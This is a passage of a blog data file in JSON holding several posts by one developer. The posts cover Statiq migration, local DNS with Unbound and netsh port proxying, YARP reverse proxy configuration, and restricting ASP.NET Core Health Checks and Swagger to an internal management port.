bootstrap 3 to upgrade issue.  ## Publishing to Netlify\\nInstall the Netlify CLI `npm install netlify-cli -g`  ## Exclude NetlifyCMS directory from processing and copy it to output\\nI have been managing my [Wyam blog with NetlifyCMS](https:/github.comMarkZithermywyamblogtreemasterinputadmin), this is simply a directory called `admin` with 2 files, `index.html` and `config.yml`. Wyam copied those files unchanged to the output.  With Statiq that has changed and it processes the html file which makes it invalid, skips the `config.yml` file and adds a link to `admin` to the NavBar.  Adding a file called `_directory.yml` to the `admin` directory makes it possible to set directory wide meta data, `ShowInNavBar: False` removes the admin link from the NavBar, setting the ContentType and MediaType, as discussed on the StatiqDev GitHub discussion [Migration from Wyam](https:/github.comstatiqdevDiscussionsdiscussions15), resulted in the desired behaviour  ``` yaml\\nShowInNavBar: False\\nContentType: Asset\\nMediaType: textplain\\n```  ## Update _post-footer.cshtml to set the Disqus configuration variables  ``` csharp  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */  var disqus_identifier = \'@Document.Destination.FileNameWithoutExtension.FullPath\';  var disqus_title = \'@Document.GetString(\\"Title\\")\';  var disqus_url = \'@Document.GetLink(true)\';\\n```  ## Setup the javascript for the Lunr based search  ## Setup GenerateLunrIndex to build the searchindex.js file"},{"id":"/2020/09/17/local-hostname-resolution-to-port","metadata":{"permalink":"/docs/blog/2020/09/17/local-hostname-resolution-to-port","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-17-local-hostname-resolution-to-port.md","source":"@site/blog/2020-09-17-local-hostname-resolution-to-port.md","title":"Local Hostname Resolution To Port","description":"How to Resolve a Local Hostname to a Port","date":"2020-09-17T00:00:00.000Z","tags":[{"inline":false,"label":"netsh","permalink":"/docs/blog/tags/netsh","description":"Windows network shell"},{"inline":false,"label":"Unbound","permalink":"/docs/blog/tags/unbound","description":"DNS resolver"},{"inline":false,"label":"DNS","permalink":"/docs/blog/tags/dns","description":"Domain Name System"}],"readingTime":2.63,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Local Hostname Resolution To Port","authors":["mark-burton"],"tags":["netsh","unbound","dns"],"description":"How to Resolve a Local Hostname to a Port","date":"2020-09-17"},"unlisted":false,"prevItem":{"title":"Migrating my blog from Wyam to Statiq","permalink":"/docs/blog/2020/09/21/migrating-my_blog-from-wyam-to-statiq"},"nextItem":{"title":"","permalink":"/docs/blog/2020/09/14/experimenting-with-yarp-a-reverse-proxy"}},"content":"It is not possible to make this work on 127.0.0.1, however the entire block 1278 is reserved for local loopback so any other 127.n.n.n address will work, more interesting reading about that on [stackoverflow](https:/serverfault.comquestions157496why-is-loopback-ip-address-from-127-0-0-1-to-127-255-255-254) and in [RFC 1700](https:/www.ietf.orgrfcrfc3330.txt) \\n:::\\n### Hosts file  Add a new entry for each service to the `hosts` file in `C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\`.  ``` cmd  127.0.0.2  mailhog.internal  127.0.0.3  git.internal\\n```  ### Unbound  Install [Unbound](https:/nlnetlabs.nlprojectsunbounddownload).  Add entries to `service.conf` by default on Windows that is in `C:\\\\Program Files\\\\Unbound`  ### .local vs .localhost vs .test vs .internal\\n:::info\\nAfter reading round in circles about reserved TLDs such as [rfc2606](https:/tools.ietf.orghtmlrfc2606#page-2) which lists `.test`, `.example`, `.invalid`, `.localhost` as reserved domain names. This stackoverflow on [best practices for internal domain and network names](https:/stackoverflow.comquestions19016553add-subdomain-to-localhost-url) This [TechNet article](https:/social.technet.microsoft.comwikicontentsarticles34981.active-directory-best-practices-for-internal-domain-and-network-names.aspx) which goes back on previous advice about the use of `.local` and `.internal`.The risks of using my initial choice of `.local` due to possible clashes with mDNS and Zero Configuration Networking. Trying to use servicename.localhost with mixed results (works with hosts file but causes Unbound to throw and error and fail to start) and noticing that docker uses `.internal` I finally found [RFC6762#appendix-G](https:/tools.ietf.orghtmlrfc6762#appendix-G) which lists `.intranet.`, `.internal.`, `.private.`,  `.corp.`, `.home.` and `.lan.` as proposed reserved domain names, I settled on using .internal.\\n:::\\n``` cmd\\nserver:  local-data: \\"mailhog.internal A 127.0.0.2\\"  local-data-ptr: \\"127.0.0.2 mailhog.internal\\"  local-data: \\"git.internal A 127.0.0.3\\"  local-data-ptr: \\"127.0.0.3 git.internal\\"  ```  Restart the service to make sure the new settings are used.  Add `127.0.0.1` at the top of the list of DNS servers in network settings.  ![Network settings with 127.0.0.1 as DNS server](/img/local_dns_with_unbound_network_settings.png)  ## Add a netsh interface portproxy  ```\\nnetsh interface portproxy add v4tov4 listenport=80 listenaddress=127.0.0.2 connectport=8025 connectaddress=127.0.0.2  netsh interface portproxy add v4tov4 listenport=80 listenaddress=127.0.0.3 connectport=3005 connectaddress=127.0.0.3\\n```\\nor by domain name\\n```\\nnetsh interface portproxy add v4tov4 listenport=80 listenaddress=mailhog connectport=8025 connectaddress=127.0.0.2  netsh interface portproxy add v4tov4 listenport=80 listenaddress=git.local connectport=3005 connectaddress=127.0.0.3\\n```  :::info\\nBetween the 16 million loopback addresses and 65 thousand (48k usable according to [TCPIP number usage] and the Microsoft article [Port Exhaustion and You]) ports that leaves us a whole lot of services we can address on a single machine. \\n:::\\nI still need to figure out how this will work with IPv6 at the moment I only use IPv4 locally. I also need to understand the exact equivalence of `127.0.0.08` and `::1128`.  netsh interface portproxy add v6tov4 listenport=80 listenaddress \\\\\\\\{IPv6Address | HostName\\\\} \\\\[connectaddress=] \\\\\\\\{IPv4Address | HostName\\\\} \\\\[[connectport=] \\\\\\\\{Integer | ServiceName\\\\}] \\\\[[listenaddress=] \\\\\\\\{IPv6Address | HostName\\\\} \\\\[[protocol=]tcp]  Full [Network Shell (netsh) documentation](https:/docs.microsoft.comen-uswindows-servernetworkingtechnologiesnetshnetsh-interface-portproxy) on Microsoft docs.  ## References\\n[Using port number in Windows host file]: https:/stackoverflow.coma/366467497400768\\n[TCPIP number usage]: https:/stackoverflow.comquestions113224what-is-the-largest-tcp-ip-network-port-number-allowable-for-ipv4\\n[Port Exhaustion and You]: https:/docs.microsoft.comen-usarchiveblogsaskdsport-exhaustion-and-you-or-why-the-netstat-tool-is-your-friend"},{"id":"/2020/09/14/experimenting-with-yarp-a-reverse-proxy","metadata":{"permalink":"/docs/blog/2020/09/14/experimenting-with-yarp-a-reverse-proxy","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-14-experimenting-with-yarp-a-reverse-proxy.md","source":"@site/blog/2020-09-14-experimenting-with-yarp-a-reverse-proxy.md","title":"","description":"YARP is a reverse proxy toolkit for building fast proxy servers in .NET using the infrastructure from ASP.NET and .NET.","date":"2020-09-14T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"YARP","permalink":"/docs/blog/tags/yarp","description":"Yet Another Reverse Proxy"},{"inline":false,"label":"Reverse Proxy","permalink":"/docs/blog/tags/reverse-proxy","description":"Reverse proxy technologies"},{"inline":false,"label":"NGINX","permalink":"/docs/blog/tags/nginx","description":"NGINX web server"}],"readingTime":1.12,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"","Experimenting with YARP":"A Reverse Proxy\\"\\"","authors":["mark-burton"],"tags":["ASP.NET Core","YARP","Reverse Proxy","NGINX"],"description":"YARP is a reverse proxy toolkit for building fast proxy servers in .NET using the infrastructure from ASP.NET and .NET.","date":"2020-09-14"},"unlisted":false,"prevItem":{"title":"Local Hostname Resolution To Port","permalink":"/docs/blog/2020/09/17/local-hostname-resolution-to-port"},"nextItem":{"title":"Getting the most out of Swagger in your ASP.NET Core api","permalink":"/docs/blog/2020/09/09/getting-the-most-out-of-swagger-in-your-asp-net-core-api"}},"content":"A Route is the inbound URL which the reverse proxy is going to act on. The cluster is a list of potential destination URLs.\\n\\n```json\\n\\"ReverseProxy\\": {\\n  \\"Routes\\": [\\n    {\\n      \\"RouteId\\": \\"LoginServiceRoute\\",\\n      \\"ClusterId\\": \\"clusterLoginService\\",\\n      \\"Match\\": {\\n        \\"Path\\": \\"/loginservice/{**remainder}\\"\\n      },\\n      \\"Transforms\\": [\\n        {\\n          \\"PathRemovePrefix\\": \\"/loginservice\\"\\n        }\\n      ]\\n    }\\n  ],\\n  \\"Clusters\\": {\\n    \\"clusterLoginService\\": {\\n      \\"Destinations\\": {\\n        \\"clusterLoginService/destination1\\": {\\n          \\"Address\\": \\"https://localhost:1116/\\"\\n        }\\n      }\\n    }\\n  }\\n}\\n```  This would be similar to this NGINX virtual server configuration.\\n\\n```nginx\\nserver {\\n  listen 80;\\n  server_name localhost;\\n  location /loginservice/ {\\n    proxy_pass https://localhost:1116/;\\n  }\\n}\\n```  Take care when adding a transformation to a route, **do not** add a single transformation, it must be wrapped in [] or you will get no transformations and lots of confusion.\\n\\nMy mistake looked like this\\n\\n```json\\n{\\n  \\"RouteId\\": \\"TestServiceRoute\\",\\n  \\"ClusterId\\": \\"clusterTestService\\",\\n  \\"Match\\": {\\n    \\"Path\\": \\"/testservice/{**remainder}\\"\\n  },\\n  \\"Transforms\\": {\\n    \\"PathRemovePrefix\\": \\"/testservice\\"\\n  }\\n},\\n```  It took debugging into the YARP source to figure out my mistake which resulted in 503 and 404 errors due to URLs like `https://localhost:1116/loginservice/hc` instead of the correct `https://localhost:1116/hc`.\\n\\n```json\\n{\\n  \\"RouteId\\": \\"TestServiceRoute\\",\\n  \\"ClusterId\\": \\"clusterTestService\\",\\n  \\"Match\\": {\\n    \\"Path\\": \\"/testservice/{**remainder}\\"\\n  },\\n  \\"Transforms\\": [ // <-- was missing\\n    {\\n      \\"PathRemovePrefix\\": \\"/testservice\\"\\n    }\\n  ] // <-- was missing\\n},\\n```  It is easier to see the issue as soon as you start adding additional transformations. In preview 5 for example it is possible to transform route values to querystring parameters, now it is clear that `Transformations` must be an array.\\n\\n```json\\n{\\n  \\"RouteId\\": \\"TestPatternServiceRoute\\",\\n  \\"ClusterId\\": \\"clusterTestService\\",\\n  \\"Match\\": {\\n    \\"Path\\": \\"/testpatternservice/{**remainder}\\"\\n  },\\n  \\"Transforms\\": [\\n    {\\n      \\"PathPattern\\": \\"/search\\"\\n    },\\n    {\\n      \\"QueryRouteParameter\\": \\"q\\",\\n      \\"Append\\": \\"remainder\\"\\n    }\\n  ]\\n},\\n```"},{"id":"/2020/09/09/getting-the-most-out-of-swagger-in-your-asp-net-core-api","metadata":{"permalink":"/docs/blog/2020/09/09/getting-the-most-out-of-swagger-in-your-asp-net-core-api","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-09-getting-the-most-out-of-swagger-in-your-asp-net-core-api.md","source":"@site/blog/2020-09-09-getting-the-most-out-of-swagger-in-your-asp-net-core-api.md","title":"Getting the most out of Swagger in your ASP.NET Core api","description":"Even with next to no configuration or additional work on your API Swagger already provides great insights into your API.  To give consumers of the API even more information on what to expect from the API you can add annotations to","date":"2020-09-09T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Swagger","permalink":"/docs/blog/tags/swagger","description":"API documentation with Swagger"}],"readingTime":0.21,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Getting the most out of Swagger in your ASP.NET Core api","authors":["mark-burton"],"tags":["ASP.NET Core","Swagger"],"date":"2020-09-09"},"unlisted":false,"prevItem":{"title":"","permalink":"/docs/blog/2020/09/14/experimenting-with-yarp-a-reverse-proxy"},"nextItem":{"title":"How to Setup ASP.NET Core Health Check UI","permalink":"/docs/blog/2020/09/09/how-to-setup-asp-net-core-health-check-ui"}},"content":"Even with next to no configuration or additional work on your API Swagger already provides great insights into your API.  To give consumers of the API even more information on what to expect from the API you can add annotations to"},{"id":"/2020/09/09/how-to-setup-asp-net-core-health-check-ui","metadata":{"permalink":"/docs/blog/2020/09/09/how-to-setup-asp-net-core-health-check-ui","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-09-how-to-setup-asp-net-core-health-check-ui.md","source":"@site/blog/2020-09-09-how-to-setup-asp-net-core-health-check-ui.md","title":"How to Setup ASP.NET Core Health Check UI","description":"In Part one we setup the health check endpoints, now to add a frontend.","date":"2020-09-09T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Health Checks","permalink":"/docs/blog/tags/health-checks","description":"Application health monitoring"}],"readingTime":1.87,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"How to Setup ASP.NET Core Health Check UI","authors":["mark-burton"],"tags":["ASP.NET Core","Health Checks"],"date":"2020-09-09"},"unlisted":false,"prevItem":{"title":"Getting the most out of Swagger in your ASP.NET Core api","permalink":"/docs/blog/2020/09/09/getting-the-most-out-of-swagger-in-your-asp-net-core-api"},"nextItem":{"title":"Secure ASP.NET Core Health Checks to a specific port","permalink":"/docs/blog/2020/09/08/secure-asp-net-core-health-checks-to-a-specific-port"}},"content":"In [Part one](2020-09-08-secure-asp-net-core-health-checks-to-a-specific-port) we setup the health check endpoints, now to add a frontend.\\n\\nThe [Health Checks UI](2020-09-08-secure-asp-net-core-health-checks-to-a-specific-port) is best hosted in its own service as it can consolidate health checks for a number of services.\\n\\n![Swagger CORS error](/img/healthchecksui.png)\\n\\nAdding the HealthChecks UI to the service involves adding 2 nuget packages, the main `AspNetCore.HealthChecks.UI` package and a storage provider, initially I have used the InMemory storage provider as I do not have the need to see historical data. There are also providers various databases including SqlServer and SQLite which can be used to persist the data.\\n\\n```xml\\n<PackageReference Include=\\"AspNetCore.HealthChecks.UI\\" Version=\\"$(AspNetCoreHealthChecksUIVersion)\\" />\\n<PackageReference Include=\\"AspNetCore.HealthChecks.UI.InMemory.Storage\\" Version=\\"$(AspNetCoreHealthChecksUIVersion)\\" />\\n```\\n\\nAs the HealthChecks nuget packages will be used across all projects I have set the version numbers centrally in [Directory.Build.props](https://github.com/MarkZither/SwaggerAndHealthCheckBlog/blob/master/Directory.Build.props).\\n\\n```xml\\n<AspNetCoreHealthChecksUIVersion>3.1.1</AspNetCoreHealthChecksUIVersion>\\n```\\n\\nThe HealthChecks UI can now be added to `ConfigureServices` and `Configure` in [Startup.cs](https://github.com/MarkZither/SwaggerAndHealthCheckBlog/blob/master/src/MonitoringService/Startup.cs).\\n\\nAs I want to limit the access to the UI in the same way as I did for the HealthCheck endpoints I have the service listening on multiple ports and use `RequireHost` when configuring the endpoints to ensure the UI is only accessible internally.\\n\\n```csharp\\npublic void ConfigureServices(IServiceCollection services)\\n{\\n  services\\n    .AddHealthChecksUI()\\n    .AddInMemoryStorage();\\n  services.AddControllers();\\n}\\n\\npublic void Configure(IApplicationBuilder app, IWebHostEnvironment env)\\n{\\n  app.UseHealthChecksUI();\\n  app.UseEndpoints(endpoints => {\\n    endpoints.MapControllers();\\n    endpoints.MapHealthChecksUI(config => {\\n      config.UIPath = \\"/hc-ui\\";\\n    }).RequireHost($\\"*:{Configuration[\\"ManagementPort\\"]}\\");\\n  });\\n}\\n```  Finally we need to tell the UI where to read the HealthChecks from, this can either be done in a configuration file  ```json\\n...\\n\\"https_port\\": 1131,\\n\\"Urls\\": \\"http://localhost:1130;https://localhost:1131;https://localhost:1132\\",\\n\\"ManagementPort\\": \\"1132\\",\\n\\"AllowedHosts\\": \\"*\\",\\n\\"HealthChecks-UI\\": {\\n  \\"HealthChecks\\": [\\n    {\\n      \\"Name\\": \\"LoginService Check\\",\\n      \\"Uri\\": \\"https://localhost:1116/hc\\"\\n    },\\n    {\\n      \\"Name\\": \\"ResourceService Check\\",\\n      \\"Uri\\": \\"https://localhost:5002/hc\\"\\n    },\\n    {\\n      \\"Name\\": \\"NotificationService Check\\",\\n      \\"Uri\\": \\"https://localhost:1179/hc\\"\\n    }\\n  ]\\n}\\n...\\n```  or in code by adding settings to the `AddHealthChecksUI` method.  ```csharp\\nservices.AddHealthChecksUI(setupSettings: settings => {\\n  settings\\n    .DisableDatabaseMigrations()\\n    .AddHealthCheckEndpoint(name: healthCheckName, uri: healthCheckUri)\\n    .AddWebhookNotification(name: webhookName, uri: webhookUri, payload: webhookPayload,\\n      restorePayload: webhookRestorePayload)\\n    .SetEvaluationTimeInSeconds(evaluationTimeInSeconds)\\n    .SetMinimumSecondsBetweenFailureNotifications(minimumSeconds);\\n}).AddInMemoryStorage();\\n```  You can get the full working demo from [my GitHub repo](https:/github.comMarkZitherSwaggerAndHealthCheckBlog)."},{"id":"/2020/09/08/secure-asp-net-core-health-checks-to-a-specific-port","metadata":{"permalink":"/docs/blog/2020/09/08/secure-asp-net-core-health-checks-to-a-specific-port","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-08-secure-asp-net-core-health-checks-to-a-specific-port.md","source":"@site/blog/2020-09-08-secure-asp-net-core-health-checks-to-a-specific-port.md","title":"Secure ASP.NET Core Health Checks to a specific port","description":"Health Checks in ASP.NET Core can give valuable insights into the health of services, but that includes sensitive data that should not be leaked externally.","date":"2020-09-08T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Health Checks","permalink":"/docs/blog/tags/health-checks","description":"Application health monitoring"}],"readingTime":1.95,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Secure ASP.NET Core Health Checks to a specific port","authors":["mark-burton"],"tags":["ASP.NET Core","Health Checks"],"description":"Health Checks in ASP.NET Core can give valuable insights into the health of services, but that includes sensitive data that should not be leaked externally.","date":"2020-09-08"},"unlisted":false,"prevItem":{"title":"How to Setup ASP.NET Core Health Check UI","permalink":"/docs/blog/2020/09/09/how-to-setup-asp-net-core-health-check-ui"},"nextItem":{"title":"Secure Swagger on ASP.NET Core by address and port","permalink":"/docs/blog/2020/09/08/secure-swagger-on-asp-net-core-by-address-and-port"}},"content":"To secure Health Checks it is possible to make them available on internal addresses only and on a different port to the publicly served pagesAPI endpoints.  First we need to make the service available over 2 different ports, this can be achieved by adding a Urls value to the appsettings.config.  ```json  \\"Logging\\": \\\\\\\\\\\\{  \\"IncludeScopes\\": false,  \\"LogLevel\\": \\\\{  \\"Default\\": \\"Debug\\",  \\"System\\": \\"Information\\",  \\"Microsoft\\": \\"Information\\"  \\\\\\\\}  },  \\"Urls\\": \\"http:/localhost:1114;http:/localhost:1115\\",  \\"ManagementPort\\": \\"1115\\",  \\"ConnectionStrings\\": \\\\\\\\{  \\"LoginServiceDb\\": \\"Data Source=.,11433;Initial Catalog=LoginServiceDatabase;Integrated Security=true;\\"  \\\\},\\n```  This can be done in several ways, and is described in more detail by Andrew Lock in his post [5 ways to set the URLs for an ASP.NET Core app](https:/andrewlock.net5-ways-to-set-the-urls-for-an-aspnetcore-app).  Now when you debug the service you should see in the log that it is listening on 2 ports  ```\\ninfo: Microsoft.Hosting.Lifetime[0]  Now listening on: http:/localhost:1114\\ninfo: Microsoft.Hosting.Lifetime[0]  Now listening on: http:/localhost:1115\\ninfo: Microsoft.Hosting.Lifetime[0]  Application started. Press Ctrl+C to shut down.\\n```  :::primary\\n**Special note if you are using http.sys** If you want to run this over https you will need to take care of the port reservation and certification binding. I have a explanation of that in the GitHub Repo README.\\n:::  Now that we have the service listening on 2 addresses we can specify one of them will serve up the Health Checks by setting the `ManagementPort`.  In `startup.cs` we can use the `ManagementPort` to secure the Health Check endpoint  ```csharp  HealthCheck middleware  app.UseHealthChecks(\\"hc\\", $\\"\\\\\\\\{Configuration[\\"ManagementPort\\"]\\\\}\\", new HealthCheckOptions() \\\\\\\\{  Predicate = _ => true,  ResponseWriter = UIResponseWriter.WriteHealthCheckUIResponse  \\\\});  app.UseEndpoints(endpoints => \\\\\\\\\\\\{  endpoints.MapControllerRoute(\\"default\\", \\"\\\\{controller=Home\\\\\\\\}\\\\{action=Index\\\\}\\\\\\\\{id?\\\\}\\");  endpoints.MapHealthChecks(\\"health\\").RequireHost($\\"*:\\\\\\\\{Configuration[\\"ManagementPort\\"]\\\\}\\");  });\\n```  If you debug now you will have access to the `health` endpoint only on the `ManagementPort` and not on the public facing URL.  ![HealthCheck external shows 404 while internal shows overall health status](/img/health_endpoint.png) More interestingly you can also go to the `hc` endpoint, this contains more detailed information about the state of the service and therefore needs to be secured.  ![HealthCheck external shows 404 while internal shows detailed health status](/img/hc_endpoint.png) Now you can safely get the status of your services reported as json, but there are 2 further aspects of ASP.NET Core Health Checks, the UI and push-based monitoring, i will cover those in parts 2 and 3."},{"id":"/2020/09/08/secure-swagger-on-asp-net-core-by-address-and-port","metadata":{"permalink":"/docs/blog/2020/09/08/secure-swagger-on-asp-net-core-by-address-and-port","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-08-secure-swagger-on-asp-net-core-by-address-and-port.md","source":"@site/blog/2020-09-08-secure-swagger-on-asp-net-core-by-address-and-port.md","title":"Secure Swagger on ASP.NET Core by address and port","description":"This follows on from my previous post Secure ASP.NET Core Health Checks to a specific port and assumes that you already have your service running over 2 ports and have specified a ManagementPort in the appsettings.json file.","date":"2020-09-08T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Swagger","permalink":"/docs/blog/tags/swagger","description":"API documentation with Swagger"},{"inline":false,"label":"Swashbuckle","permalink":"/docs/blog/tags/swashbuckle","description":"Swagger tools for .NET"}],"readingTime":2.76,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Secure Swagger on ASP.NET Core by address and port","authors":["mark-burton"],"tags":["ASP.NET Core","Swagger","Swashbuckle"],"date":"2020-09-08"},"unlisted":false,"prevItem":{"title":"Secure ASP.NET Core Health Checks to a specific port","permalink":"/docs/blog/2020/09/08/secure-asp-net-core-health-checks-to-a-specific-port"},"nextItem":{"title":"VSTO installs over HTTPS issues","permalink":"/docs/blog/VSTO-installs-over-HTTPS-issues"}},"content":"This follows on from my previous post [Secure ASP.NET Core Health Checks to a specific port](2020-09-08-secure-asp-net-core-health-checks-to-a-specific-port) and assumes that you already have your service running over 2 ports and have specified a `ManagementPort` in the appsettings.json file.\\n\\n:::primary\\n**Special note if you are using http.sys** If you want to run this over https you will need to take care of the port reservation and certification binding. I have a explanation of that in the GitHub Repo README.\\n:::\\n\\nSwagger is a powerful tool to test your APIs and allow users to easily discover how to consume your APIs, but it can also open up security issues and make it easier for attackers to access your data.\\n\\nBest practice is to [secure access to your Swagger pages using OAuth as described by Scott Brady](https://www.scottbrady91.com/Identity-Server/ASPNET-Core-Swagger-UI-Authorization-using-IdentityServer4) but in some scenarios it would be better if the Swagger pages are not be accessible externally at all.\\n\\nAs discussed in this [GitHub issue, it is not possible out of the box to limit access to a specific URL](https://github.com/domaindrivendev/Swashbuckle/issues/384).\\n\\nBy changing the SwaggerEndpoint to specify absolute URL it is possible to prevent access to the documentation on the public facing URL.\\n\\n```csharp\\napp.UseSwaggerUI(c => {\\n  c.SwaggerEndpoint(\\"http://localhost:1115/swagger/v1/swagger.json\\", \\"Login Service API V1\\");\\n  c.RoutePrefix = string.Empty;\\n});\\n```\\n\\nHowever this still leaves the Swagger homepage accessible displaying an error message due to CORS issues.\\n\\n![Swagger CORS error](/img/swagger_internal_only_error.png)\\n\\nTo reject all requests to Swagger that are not on an internal address we need to create a middleware, [something like this suggestion by Thwaitesy](https://github.com/domaindrivendev/Swashbuckle/issues/384#issuecomment-410117400)\\n\\n```csharp\\npublic class SwaggerUrlPortAuthMiddleware {\\n  private readonly RequestDelegate next;\\n  \\n  public SwaggerUrlPortAuthMiddleware(RequestDelegate next) {\\n    this.next = next;\\n  }\\n  \\n  public async Task InvokeAsync(HttpContext context, IConfiguration configuration) {\\n    // Make sure we are hitting the swagger path, and not doing it locally and are on the management port\\n    if (context.Request.Path.StartsWithSegments(\\"/swagger\\") && !configuration.GetValue<int>(\\"ManagementPort\\").Equals(context.Request.Host.Port)) {\\n      // Return unauthorized\\n      context.Response.StatusCode = (int)HttpStatusCode.Unauthorized;\\n    }\\n    else {\\n      await next.Invoke(context);\\n    }\\n  }\\n  \\n  public bool IsLocalRequest(HttpContext context) {\\n    // Handle running using the Microsoft.AspNetCore.TestHost and the site being run entirely locally in memory without an actual TCP/IP connection\\n    if (context.Connection.RemoteIpAddress == null && context.Connection.LocalIpAddress == null) {\\n      return true;\\n    }\\n    if (context.Connection.RemoteIpAddress.Equals(context.Connection.LocalIpAddress)) {\\n      return true;\\n    }\\n    if (IPAddress.IsLoopback(context.Connection.RemoteIpAddress)) {\\n      return true;\\n    }\\n    return false;\\n  }\\n}\\n```\\n\\n![](/img/baget_project_layout.png)\\n\\nAssuming your [project layout is something like BaGet](https://github.com/loic-sharma/BaGet).\\n\\nThe middleware should be added to your shared project in the `Extensions` directory.\\n\\nAdd the following extension method to `IApplicationBuilderExtensions` to add the middleware and keep your startup clean.\\n\\n```csharp\\npublic static class SwaggerAuthorizeExtensions {\\n  public static IApplicationBuilder UseSwaggerAuthorized(this IApplicationBuilder builder) {\\n    return builder.UseMiddleware<SwaggerUrlPortAuthMiddleware>();\\n  }\\n}\\n```\\n\\nThis middleware must be registered before swagger, so in startup.cs change `Configure` to add the middleware by calling the new extension method.\\n\\n```csharp\\npublic void Configure(IApplicationBuilder app, IWebHostEnvironment env) {\\n  ...\\n  app.UseSwaggerAuthorized();\\n  app.UseSwagger();\\n  app.UseSwaggerUI(c => {\\n    c.SwaggerEndpoint(\\"/v1/swagger.json\\", \\"Login Service API V1\\");\\n  });\\n  ...\\n}\\n```\\n\\nNow running the service will return a 401 on the public facing URL and serve swagger internally.\\n\\n![Public facing swagger returns 401 internal works](/img/swagger_secured_by_port.png)\\n\\nIt is still recommended to secure swagger with OAuth as a misconfiguration could still lead to your Swagger being exposed this way, for example behind a reverse proxy."},{"id":"/VSTO-installs-over-HTTPS-issues","metadata":{"permalink":"/docs/blog/VSTO-installs-over-HTTPS-issues","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/VSTO-installs-over-HTTPS-issues.md","source":"@site/blog/VSTO-installs-over-HTTPS-issues.md","title":"VSTO installs over HTTPS issues","description":"Test with this setup.exe.  ## The Problem","date":"2019-02-25T00:00:00.000Z","tags":[{"inline":false,"label":"VSTO","permalink":"/docs/blog/tags/vsto","description":"Visual Studio Tools for Office"},{"inline":true,"label":"HTTPS","permalink":"/docs/blog/tags/https"},{"inline":true,"label":"GPO","permalink":"/docs/blog/tags/gpo"},{"inline":true,"label":"IE Security","permalink":"/docs/blog/tags/ie-security"}],"readingTime":0.89,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"VSTO installs over HTTPS issues","authors":["mark-burton"],"date":"2019-02-25","tags":["VSTO","HTTPS","GPO","IE Security"]},"unlisted":false,"prevItem":{"title":"Secure Swagger on ASP.NET Core by address and port","permalink":"/docs/blog/2020/09/08/secure-swagger-on-asp-net-core-by-address-and-port"},"nextItem":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part 2"}},"content":"Test with this [setup.exe](assetstestvstosetup.exe).  ## The Problem\\nSetup runs sucessfully over http, but switch to https by publishing again with the https url or by using `setup.exe -url=\\"https:/myurl.comMyAppFoldersetup.exe\\"`\\n```\\nURLDownloadToCacheFile failed with HRESULT \'-2146697208\'\\nError: An error occurred trying to download \'https:/myurl.comMyAppFoldersetup.exe\'.\\n```  ## Other Examples\\nhttps:/stackoverflow.comquestions20244507download-clickonce-fails-from-setup-exe  ## Solution  As explained on technet [https:/social.technet.microsoft.comForumsieen-US3d443283-c251-44b8-99ab-7ee33c928eeegroup-policy-setting-blocking-downloads-from-https-even-on-trusted-sites?forum=ieitprocurrentver](Check the GPO) the GPO was under:  User Configuration\\\\Policies\\\\Administrative Templates\\\\Windows Components\\\\Internet Explorer\\\\Internet Control Panel\\\\Security Pages\\\\Advanced Page\\\\Do not save encrypted pages to disk  or  User Configuration\\\\Policies\\\\Administrative Templates\\\\Windows Components\\\\Internet Explorer\\\\Internet Control Panel\\\\Advanced Page\\\\Do not save encrypted pages to disk  ![Group Policy Management Editor](/img/GPOIE.png)  By default this value is not configured\\n![Do Not Save Encrypted File To Disc Dialog](/img/DoNotSaveEncryptedFileToDiscDialog.png)  In Internet Explorer the associated configuration option is found in Internet Options on the Advanced tab.\\n![Do Not Save Encrypted File To Disc 